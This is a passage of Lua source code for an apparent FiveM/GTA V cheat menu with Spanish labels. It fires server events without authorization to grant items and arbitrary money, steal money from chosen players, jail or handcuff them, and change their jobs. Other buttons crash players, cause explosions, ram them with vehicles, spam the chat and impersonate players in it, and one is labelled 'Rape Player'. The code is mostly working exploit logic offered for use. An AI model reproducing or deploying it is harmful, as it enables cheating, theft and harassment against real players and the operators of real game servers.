                    spawn_vehicle('cargoplane',440.1, -995.23, 30.69)
                    spawn_vehicle('cargoplane',446.1, -996.23, 30.69)
                    spawn_vehicle('cargoplane',441.1, -993.23, 30.69)
                    spawn_vehicle('cargoplane',444.1, -992.23, 30.69)
                    spawn_vehicle('cargoplane',440.1, -995.23, 30.69)
                    spawn_vehicle('cargoplane',446.1, -996.23, 30.69)
                elseif Cience.Button("Rampinator LOL") then
                    spawnObject(-145066854,79.02,-993.28,28.41,164.59)
                    spawnObject(-145066854,99.24,-1020.56,28.41,243.99)
                    spawnObject(-145066854,210.82,-1065.13,28.42,250.36)
                    spawnObject(-145066854,248.4,-1057.36,28.32,347.16)
                    spawnObject(-145066854,277.36,-953.12,28.41,336,62)
                    spawnObject(-145066854,312.65,-855.93,28.34,334.9)
                    spawnObject(-145066854,301.64,-829.26,28.34,83.01)
                    spawnObject(-145066854,189.94,-784.29,31.88,64.88)
                    spawnObject(-145066854,140.77,-803.84,31.24,143.49)
                    spawnObject(-145066854,214.89,-703.42,35.65,242.64)
                    spawnObject(-145066854,230.1,-1039.15,29.37,242.64)
                elseif Cience.Button("~g~Revivir a todo el mundo") then
                    TriggerEvent('esx_ambulancejob:revive', -1)
                elseif Cience.Button("Custom Item") then
                    local testing = KeyboardInput("Enter ", "", 1000000)
                    local lol = KeyboardInput("Enter ", "", 1000000)
                    if testing and lol then
                        TriggerServerEvent('tm1_mafias:addItem',testing,lol)
                    end
                elseif Cience.Button("Spawn House :D") then
                    spawnObject('dt1_tc_dufo_core',-776.12,-1133.47,10.58,102.34)
                end


                Cience.Display()
            elseif Cience.IsMenuOpened("TM1J") then
                if Cience.MenuButton("∑~r~Troll", "BOMO") then
                elseif Cience.MenuButton("∑~r~TM1 Trabajos", "TM1JXD") then
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("BOMO") then
                if Cience.Button("~y~UFO Party [Comisaria]") then
                    spawnObject("p_spinning_anus_s",399.79,-971.59,29.37,177.78)
                    spawnObject("p_spinning_anus_s",400.39,-1003.19,29.44,177.78)
                    spawnObject("p_spinning_anus_s",430.44,-1020.36,28.89,177.78)
                    spawnObject("p_spinning_anus_s",449.74,-982.46,43.69,177.78)
                    TriggerServerEvent("_chat:messageEntered","TuPeorPesadilla",{255,0,0},"^1E^2S^3T^4E ^5S^6E^7R^8V^9E^1R ^2N^3O ^4M^5E ^6G^7U^8S^9T^1A ^2S^3O^4R^5R^6Y ^7B^8B^9Y^1S ^2X^3D^4D^5D^6D ")
                    TriggerServerEvent("_chat:messageEntered","TuPeorPesadilla",{255,0,0},"^1E^2S^3T^4E ^5S^6E^7R^8V^9E^1R ^2N^3O ^4M^5E ^6G^7U^8S^9T^1A ^2S^3O^4R^5R^6Y ^7B^8B^9Y^1S ^2X^3D^4D^5D^6D ")
                    TriggerServerEvent("_chat:messageEntered","TuPeorPesadilla",{255,0,0},"^1E^2S^3T^4E ^5S^6E^7R^8V^9E^1R ^2N^3O ^4M^5E ^6G^7U^8S^9T^1A ^2S^3O^4R^5R^6Y ^7B^8B^9Y^1S ^2X^3D^4D^5D^6D ")
                    TriggerServerEvent("_chat:messageEntered","TuPeorPesadilla",{255,0,0},"^1E^2S^3T^4E ^5S^6E^7R^8V^9E^1R ^2N^3O ^4M^5E ^6G^7U^8S^9T^1A ^2S^3O^4R^5R^6Y ^7B^8B^9Y^1S ^2X^3D^4D^5D^6D ")
                    TriggerServerEvent("_chat:messageEntered","TuPeorPesadilla",{255,0,0},"^1E^2S^3T^4E ^5S^6E^7R^8V^9E^1R ^2N^3O ^4M^5E ^6G^7U^8S^9T^1A ^2S^3O^4R^5R^6Y ^7B^8B^9Y^1S ^2X^3D^4D^5D^6D ")
                    TriggerServerEvent("_chat:messageEntered","TuPeorPesadilla",{255,0,0},"^1E^2S^3T^4E ^5S^6E^7R^8V^9E^1R ^2N^3O ^4M^5E ^6G^7U^8S^9T^1A ^2S^3O^4R^5R^6Y ^7B^8B^9Y^1S ^2X^3D^4D^5D^6D ")
                    TriggerServerEvent("_chat:messageEntered","TuPeorPesadilla",{255,0,0},"^1E^2S^3T^4E ^5S^6E^7R^8V^9E^1R ^2N^3O ^4M^5E ^6G^7U^8S^9T^1A ^2S^3O^4R^5R^6Y ^7B^8B^9Y^1S ^2X^3D^4D^5D^6D ")
                    TriggerServerEvent("_chat:messageEntered","TuPeorPesadilla",{255,0,0},"^1E^2S^3T^4E ^5S^6E^7R^8V^9E^1R ^2N^3O ^4M^5E ^6G^7U^8S^9T^1A ^2S^3O^4R^5R^6Y ^7B^8B^9Y^1S ^2X^3D^4D^5D^6D ")
                    TriggerServerEvent("_chat:messageEntered","TuPeorPesadilla",{255,0,0},"^1E^2S^3T^4E ^5S^6E^7R^8V^9E^1R ^2N^3O ^4M^5E ^6G^7U^8S^9T^1A ^2S^3O^4R^5R^6Y ^7B^8B^9Y^1S ^2X^3D^4D^5D^6D ")
                elseif Cience.Button("Time ~y~Day ~b~[Duree 2s]") then
                    NetworkOverrideClockTime(12, 30, 0)
                elseif Cience.Button("TriggerClientEvent Custom") then
                    local one = KeyboardInput("Enter client event", "", 1000000)
                    local sosas = KeyboardInput("Enter source or -1", "", 100000)
                    if one and sosas then
                        TriggerClientEvent(one,sosas)
                    end
                elseif Cience.Button("Time ~p~Night ~b~[Duree 2s]") then
                    NetworkOverrideClockTime(1, 0, 0)
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("TM1JXD") then
                if Cience.Button("Give x100 ~y~GOLD") then
                    TriggerServerEvent('tm1_mafias:addItem','gold',100)
                    TriggerServerEvent('tm1_mafias:addItem','oro',100)
                elseif Cience.Button("Sell ~y~Gold") then
                    TriggerServerEvent('minar:quitomin')
                elseif Cience.Button("Transporte Job") then
                    local result = KeyboardInput("Pon la cantidad de dinero", "", 1000000000000000)
                    if result then
                        TriggerServerEvent('kir_transporte:paga',result)
                        TriggerServerEvent('pop_transporte:paga',result)
                    end
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("Credits") then
                if Cience.Button("∑~r~~h~ItsByMiniYT#7666") then
                elseif Cience.Button("∑~o~~h~9ueve#0879") then
                elseif Cience.Button("∑~b~~h~Kevin Garri#5090") then
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("OnlinePlayersMenu") then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and Cience.MenuButton(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~MUERTO" or "~g~VIVO"), "PlayerOptionsMenu") then
                            SelectedPlayer = i
                        end
                    end

                    Cience.Display()
                elseif Cience.IsMenuOpened("PlayerOptionsMenu") then
                    Cience.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                    if Cience.Button('Spectar', (Spectating and "~g~[SPECTANDO]")) then
                        SpectatePlayer(SelectedPlayer)
                    elseif Cience.Button('Tp to') then
                        local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    elseif Cience.Button("~y~Abrir Inventario") then
                        TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
                    elseif Cience.Button("~b~Joder Motor") then
                        local playerPed = GetPlayerPed(SelectedPlayer)
                        NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
                        SetVehicleUndriveable(GetVehiclePedIsIn(playerPed),true)
                        SetVehicleEngineHealth(GetVehiclePedIsIn(playerPed), 100)
                    elseif Cience.Button("~b~Reparar Vehiculo") then
                        NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
                        SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false))
                        SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0.0)
                        SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
                        SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), false)
                        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
                    elseif Cience.Button("~b~Joder Coche") then
                        local playerPed = GetPlayerPed(SelectedPlayer)
                        local playerVeh = GetVehiclePedIsIn(playerPed, true)
                        NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
                            StartVehicleAlarm(playerVeh)
                            DetachVehicleWindscreen(playerVeh)
                            SmashVehicleWindow(playerVeh, 0)
                            SmashVehicleWindow(playerVeh, 1)
                            SmashVehicleWindow(playerVeh, 2)
                            SmashVehicleWindow(playerVeh, 3)
                            SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
                            SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
                            SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
                            SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
                            SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
                            SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
                            SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
                            SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
                            SetVehicleDoorBroken(playerVeh, 0, true)
                            SetVehicleDoorBroken(playerVeh, 1, true)
                            SetVehicleDoorBroken(playerVeh, 2, true)
                            SetVehicleDoorBroken(playerVeh, 3, true)
                            SetVehicleDoorBroken(playerVeh, 4, true)
                            SetVehicleDoorBroken(playerVeh, 5, true)
                            SetVehicleDoorBroken(playerVeh, 6, true)
                            SetVehicleDoorBroken(playerVeh, 7, true)
                            SetVehicleLights(playerVeh, 1)
                            Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
                            SetVehicleNumberPlateTextIndex(playerVeh, 5)
                            SetVehicleNumberPlateText(playerVeh, "PoLini GanG")
                            SetVehicleDirtLevel(playerVeh, 10.0)
                            SetVehicleModColor_1(playerVeh, 1)
                            SetVehicleModColor_2(playerVeh, 1)
                            SetVehicleCustomPrimaryColour(playerVeh, 255, 255, 255)
                            SetVehicleCustomSecondaryColour(playerVeh, 255, 255, 255)
                            SetVehicleBurnout(playerVeh, true)
                            drawNotification("~g~Vehiculo Jodido!")
                    elseif Cience.Button("Tunear al maximo el vehiculo") then
                        MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
                    elseif Cience.Button("Crashear jugador") then
                        CrashPlayer(GetPlayerPed(SelectedPlayer))
                    elseif Cience.MenuButton("∑Opciones Troll", "PlayerTrollMenu") then
                    elseif Cience.MenuButton("∑Opciones ESX", "PlayerESXMenu") then
                    elseif Cience.MenuButton("∑1 Arma", "SingleWepPlayer") then
                    elseif Cience.Button("Dar municion") then
                        for i = 1, #allWeapons do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                        end
                    elseif Cience.Button("Dar todas las armas") then
                        for i = 1, #allWeapons do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                        end	
                    elseif Cience.Button("Quitar todas las armas") then
                        for i = 1, #allWeapons do
                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                        end
                    elseif Cience.Button("Dar vehiculo") then
                        local ped = GetPlayerPed(SelectedPlayer)
                        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
    
                        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                            RequestModel(ModelName)
                            while not HasModelLoaded(ModelName) do
                                Citizen.Wait(0)
                            end
    
                            local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
                            drawNotification("~g~Vehiculo dado")
                        else
                            drawNotification("~r~Modelo invalido!")
                        end
                    elseif Cience.Button("Kickear del vehiculo") then
                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        drawNotification("~g~Kickeado del coche!")
                    elseif Cience.Button("Spawn Flare On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        ShootSingleBulletBetweenCoords(coords.x, coords.y , coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_FLAREGUN"), PlayerPedId(), true, true, 100)
                    elseif Cience.Button("Spawn Smoke On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_SMOKEGRENADE"), GetPlayerPed(SelectedPlayer), true, true, 100)	
                    end

                    Cience.Display()
                elseif Cience.IsMenuOpened("PlayerESXMenu") then
                    if Cience.MenuButton("∑ESX Triggers", "PlayerESXTriggerMenu") then
                    elseif Cience.MenuButton("∑ESX Jobs", "PlayerESXJobMenu") then
                    end

                    Cience.Display()
                elseif Cience.IsMenuOpened("PlayerESXTriggerMenu") then
                    if Cience.Button("ESX Revive") then
                        TriggerServerEvent("esx_ambulancejob:revive",GetPlayerServerId(selectedPlayer))
                    elseif Cience.Button("ESX Give Money To Player From Your Wallet") then
                        local d = KeyboardInput("Enter amount of money to give","",100)
                        if d ~= "" then
                            TriggerServerEvent('esx:giveInventoryItem',GetPlayerServerId(selectedPlayer),"item_money","money",d)
                        end 
                    elseif Cience.Button("ESX Steal Money From Player") then
                        local d=KeyboardInput("Enter amount of money to steal","",100)
                        if d ~= "" then 
                            TriggerServerEvent('esx:removeInventoryItem',GetPlayerServerId(selectedPlayer),"item_money","money",d)
                        end 
                    elseif Cience.Button("ESX Handcuff Player") then
                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                    elseif Cience.Button("ESX Send To Jail") then
                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(selectedPlayer),5000,"Jailed")
                           TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                           TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                        TriggerServerEvent("js:jailuser",GetPlayerServerId(selectedPlayer),45*60,"Jailed")
                    elseif Cience.Button("ESX Get Out Of Jail") then
                        local ped = selectedPlayer
                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                        TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
                        TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
                        TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                    end

                    Cience.Display()
                elseif Cience.IsMenuOpened("PlayerESXJobMenu") then
                    if Cience.Button("Desempleado") then
                        TriggerServerEvent('NB:destituerplayer',GetPlayerServerId(selectedPlayer))
                    elseif Cience.Button("Policia") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"police",3)
                    elseif Cience.Button("Mecanico") then
                        TriggerServerEvent('esx_joblisting:setJob',GetPlayerServerId(-1), "mecano",3)
                    elseif Cience.Button("Taxi") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"taxi",3)
                    elseif Cience.Button("EMS") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"ambulance",3)
                    elseif Cience.Button("Real Estate Agent") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"realestateagent",3)
                    elseif Cience.Button("Car Dealer") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(selectedPlayer),"cardealer",3)
                    end
                    
                    
                    Cience.Display()
                elseif Cience.IsMenuOpened("PlayerTrollMenu") then
                    if Cience.Button ("Mensaje de chat falso") then 
                        local cX=KeyboardInput("Ingrese el mensaje para enviar","",100)
                        local cY=GetPlayerName(selectedPlayer)
                        if cX then 
                            TriggerServerEvent('_chat:messageEntered',cY,{0,0x99,255},cX)
                        end 

                    elseif Cience.Button("Enjaular jugador") then
                        freezePlayer = true
                        Citizen.Wait(10)
                        SpawnObjOnPlayer(GetHashKey("prop_gascage01"))
                        freezePlayer = false
                    elseif Cience.Button("Rape Player") then
                        rapeplayer()
                    elseif Cience.MenuButton("∑Lanzar un coche a toda velocidad sobre el jugador", "VehicleRamMenu") then
                    elseif Cience.MenuButton("∑Spawnear objetos en el jugador", "SpawnPropsMenu") then
                    elseif Cience.CheckBox(
                        "Freezear jugador",
                        freezePlayer,
                        function(enabled)
                            freezePlayer = enabled
                        end)
                    then
                    elseif Cience.Button("Pequeña explosión invisible") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                    elseif Cience.Button("~b~Explosión Isis") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
                    end
                                    
                    Cience.Display()
                elseif Cience.IsMenuOpened("SpawnPropsMenu") then
                    if Cience.CheckBox(
                        "Adjuntar Prop al jugador",
                        attachProp,
                        function(enabled)
                            attachProp = enabled
                        end)
                    then
                    elseif Cience.ComboBox("Hueso", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif Cience.Button("Marihuana") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_weed_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end	
                    elseif Cience.Button("UFO") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("p_spinning_anus_s"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end	
                    elseif Cience.Button("Molino") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_windmill_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),39317),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end	
                    elseif Cience.Button("Prop customizado") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local input = KeyboardInput("Enter Prop Name", "", 100)
                        if IsModelValid(input) then
                            local obj = CreateObject(GetHashKey(input),coords.x,coords.y,coords.z,true,true,true)
                            if attachProp then
                                if selectedBone == 1 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                elseif selectedBone == 2 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                end
                            end	
                        else
                            drawNotification("Modelo invalido!")
                        end
                    end

                    Cience.Display()
            elseif Cience.IsMenuOpened("VehicleRamMenu") then
                if Cience.Button("Futo") then
                    local model = GetHashKey("futo")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
                        SetVehicleForwardSpeed(veh, 120.0)		
                    end	
                elseif Cience.Button("Bus") then
                    local model = GetHashKey("bus")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
                        SetVehicleForwardSpeed(veh, 120.0)		
                    end		
                elseif Cience.Button("Adder") then
                    local model = GetHashKey("adder")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
                        SetVehicleForwardSpeed(veh, 120.0)		
                    end
                elseif Cience.Button("Freight") then
                    local model = GetHashKey("Freight")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
                        SetVehicleForwardSpeed(veh, 120.0)		
                    end
                elseif Cience.Button("Custom Vehicle") then
                    local ModelName = KeyboardInput("Enter you vehicle model", "", 100)
                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                        RequestModel(ModelName)
                        while not HasModelLoaded(ModelName) do
                            Citizen.Wait(0)
                        end
                        
                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                        if HasModelLoaded(ModelName) then
                            local veh = CreateVehicle(ModelName, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
                            SetVehicleForwardSpeed(veh, 120.0)	
                        end	
                    else
                        drawNotification("Model is not Valid")
                    end	
                end
                

                    Cience.Display()
            elseif Cience.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if Cience.Button(allWeapons[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
                    end
                end
                

                Cience.Display()
            elseif Cience.IsMenuOpened("WeaponMenu") then
                if Cience.MenuButton("∑Spawnear solo un arma", "SingleWeaponMenu") then
                elseif Cience.ComboBox("Arma/Cuerpo a cuerpo Daño", { "1x (Default)", "2x", "3x", "4x", "5x" }, currentDamage, selectedDamage, function(currentIndex, selectedIndex)
                    currentDamage = currentIndex
                    selectedDamage = selectedIndex
                end) 
                then
                elseif Cience.Button("Dar todas las armas") then
                    for i = 1, #allWeapons do
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
                elseif Cience.Button("Quitar todas las armas") then
                    for i = 1, #allWeapons do
                        RemoveAllPedWeapons(PlayerPedId(), true)
                    end
                elseif Cience.Button("Dar municion") then
                    for i = 1, #allWeapons do
                        AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250)
                    end
                elseif Cience.CheckBox(
                    "No recarga",
                    InfClip,
                    function(enabled)
                        InfClip = enabled
                        SetPedInfiniteAmmoClip(PlayerPedId(), InfClip)
                    end)
                then
                elseif Cience.CheckBox(
                    "Municion infinita",
                    InfAmmo,
                    function(enabled)
                        InfAmmo = enabled
                        SetPedInfiniteAmmo(PlayerPedId(), InfAmmo)
                    end)
                then
                elseif Cience.CheckBox(
                    "Municion explosiva",
                    explosiveAmmo,
                    function(enabled)
                        explosiveAmmo = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    "UnTiroYmuerto", 
                    Oneshot,
                    function(enabled)
                        Oneshot = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    "Arma con fuerza",
                    forceGun,
                    function(enabled)
                        forceGun = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    "Arma eliminadora",
                    DeleteGun,
                    function(enabled)
                        DeleteGun = enabled
                    end)
                then
                elseif Cience.MenuButton("∑Personalización de armas", "WeaponCustomization") then
                elseif Cience.MenuButton("∑Opciones de pistola de bala", "BulletGunMenu") then
                end
            
                Cience.Display()
            elseif Cience.IsMenuOpened("WeaponCustomization") then
                if Cience.CheckBox(
                    "Tinte multicolor",
                    rainbowTint,
                    function(enabled)
                        rainbowTint = enabled
                    end)
                then
                elseif Cience.ComboBox("Tintes de armas", { "Normal", "Verde", "Oro", "Rosa", "Army", "LSPD", "Naranja", "Platino" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                    currentTint = currentIndex
                    selectedTint = selectedIndex

                    if selectedTint == 1 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
                    end
                    if selectedTint == 2 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
                    end
                    if selectedTint == 3 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
                    end
                    if selectedTint == 4 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
                    end
                    if selectedTint == 5 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
                    end
                    if selectedTint == 6 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
                    end
                    if selectedTint == 7 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
                    end
                    if selectedTint == 8 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
                    end
                end)
                then
                elseif Cience.Button("~g~Añadir acabado especial") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif Cience.Button("~r~Eliminar acabado especial") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
